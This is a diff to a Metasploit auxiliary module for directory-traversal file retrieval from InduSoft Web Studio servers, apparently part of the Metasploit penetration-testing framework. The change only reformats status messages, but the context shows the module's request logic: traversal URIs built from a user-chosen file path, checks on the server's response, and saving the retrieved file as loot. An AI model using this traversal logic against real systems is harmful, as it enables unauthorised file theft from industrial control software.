@@ -47,7 +47,7 @@ class MetasploitModule < Msf::Auxiliary
     })
 
     if not res
-      print_error("#{rhost}:#{rport} - Unable to connect")
+      print_error("#{Rex::Socket.to_authority(rhost, rport)} - Unable to connect")
       return
     end
 
@@ -64,7 +64,7 @@ class MetasploitModule < Msf::Auxiliary
       rfile = datastore['RFILE']
     end
 
-    print_status("#{rhost}:#{rport} - Checking if file exists...")
+    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Checking if file exists...")
 
     res = send_request_cgi({
       'uri' => "/#{traversal}#{rfile}",
@@ -72,13 +72,13 @@ class MetasploitModule < Msf::Auxiliary
     })
 
     if res and res.code == 200 and res.message =~ /File Exists/
-      print_good("#{rhost}:#{rport} - The file exists")
+      print_good("#{Rex::Socket.to_authority(rhost, rport)} - The file exists")
     else
-      print_error("#{rhost}:#{rport} - The file doesn't exist")
+      print_error("#{Rex::Socket.to_authority(rhost, rport)} - The file doesn't exist")
       return
     end
 
-    print_status("#{rhost}:#{rport} - Retrieving remote file...")
+    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Retrieving remote file...")
 
     res = send_request_cgi({
       'uri' => "/#{traversal}#{rfile}",
@@ -88,15 +88,15 @@ class MetasploitModule < Msf::Auxiliary
     if res and res.code == 200 and res.message =~ /Sending file/
       loot = res.body
       if not loot or loot.empty?
-        print_status("#{rhost}:#{rport} - Retrieved empty file")
+        print_status("#{Rex::Socket.to_authority(rhost, rport)} - Retrieved empty file")
         return
       end
       f = ::File.basename(datastore['RFILE'])
       path = store_loot('indusoft.webstudio.file', 'application/octet-stream', rhost, loot, f, datastore['RFILE'])
-      print_good("#{rhost}:#{rport} - #{datastore['RFILE']} saved in #{path}")
+      print_good("#{Rex::Socket.to_authority(rhost, rport)} - #{datastore['RFILE']} saved in #{path}")
       return
     end
 
-    print_error("#{rhost}:#{rport} - Failed to retrieve file")
+    print_error("#{Rex::Socket.to_authority(rhost, rport)} - Failed to retrieve file")
   end
 end
